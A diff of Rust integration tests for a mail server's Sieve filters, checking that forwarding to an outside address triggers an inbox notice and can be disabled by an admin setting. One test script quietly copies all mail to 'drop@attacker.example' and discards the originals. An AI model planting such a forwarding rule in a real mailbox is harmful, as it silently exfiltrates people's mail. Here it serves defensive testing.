@@ -99,8 +99,9 @@ async fn sieve_scripts_file_flag_redirect_and_discard_mail() {
     let inbox = env.app.store.mailbox_by_role(bob.id, "inbox").await.unwrap().unwrap();
     let messages = env.app.store.messages_in(inbox.id).await.unwrap();
     let subjects: Vec<&str> = messages.iter().map(|m| m.subject.as_str()).collect();
-    assert_eq!(subjects, ["Meeting", "Please forward me", "Plain"], "discarded and filed mail is not in the inbox");
-    assert!(messages[0].flagged && messages[0].keywords.contains("important"));
+    // The first is the server's note that the filter forwards mail outside.
+    assert_eq!(subjects, ["Your mail is now forwarded to another address", "Meeting", "Please forward me", "Plain"], "discarded and filed mail is not in the inbox");
+    assert!(messages[1].flagged && messages[1].keywords.contains("important"));
     assert_eq!(api.get("/api/me/labels").await.body, json!(["important"]));
 
     queue::process_due(&env.app).await;
@@ -114,7 +115,40 @@ async fn sieve_scripts_file_flag_redirect_and_discard_mail() {
     // An inactive script does nothing.
     api.put("/api/me/sieve", json!({ "script": script, "active": false })).await;
     assert!(c.send_mail("x@remote.example", &["bob@example.org"], &message("x@remote.example", "bob@example.org", "unwanted", "x")).await.starts_with("250"));
-    assert_eq!(env.app.store.messages_in(inbox.id).await.unwrap().len(), 4);
+    assert_eq!(env.app.store.messages_in(inbox.id).await.unwrap().len(), 5, "saving the same forward again tells nobody");
+}
+
+#[tokio::test]
+async fn sieve_forwarding_outside_is_announced_and_can_be_switched_off() {
+    let sink = Sink::start().await;
+    let relay = sink.relay();
+    let env = TestEnv::start_with(|cfg| cfg.outbound_relay = Some(relay)).await;
+    env.domain("example.org").await;
+    let bob = env.account("bob@example.org").await;
+    env.account("carol@example.org").await;
+    let api = Api::logged_in(&env, "bob@example.org").await;
+    let inbox = env.app.store.mailbox_by_role(bob.id, "inbox").await.unwrap().unwrap();
+
+    // Forwarding to a colleague on this server is not announced; a new outside address is,
+    // even when the same filter also discards everything (the note does not pass through it).
+    let local = r#"redirect "carol@example.org";"#;
+    assert_eq!(api.put("/api/me/sieve", json!({ "script": local, "active": true })).await.status, StatusCode::OK);
+    assert!(env.app.store.messages_in(inbox.id).await.unwrap().is_empty());
+    let script = r#"require ["copy", "variables"]; redirect :copy "drop@attacker.example"; if header :matches "subject" "*" { redirect "${1}@elsewhere.example"; } discard;"#;
+    assert_eq!(api.put("/api/me/sieve", json!({ "script": script, "active": true })).await.status, StatusCode::OK);
+    let notes = env.app.store.messages_in(inbox.id).await.unwrap();
+    assert_eq!(notes.len(), 1);
+    let note = String::from_utf8(env.app.store.read_blob(&notes[0].blob_hash).await.unwrap()).unwrap();
+    assert!(note.contains("drop@attacker.example") && note.contains("${1}@elsewhere.example"), "{note}");
+
+    // With forwarding outside switched off, nothing leaves.
+    let mut runtime = (*env.app.rt()).clone();
+    runtime.sieve_external_redirect = false;
+    env.app.settings.store(std::sync::Arc::new(runtime));
+    let mut c = Client::smtp(env.mx).await;
+    assert!(c.send_mail("x@remote.example", &["bob@example.org"], &message("x@remote.example", "bob@example.org", "hello", "x")).await.starts_with("250"));
+    queue::process_due(&env.app).await;
+    assert!(sink.received().is_empty());
 }
 
 #[tokio::test]
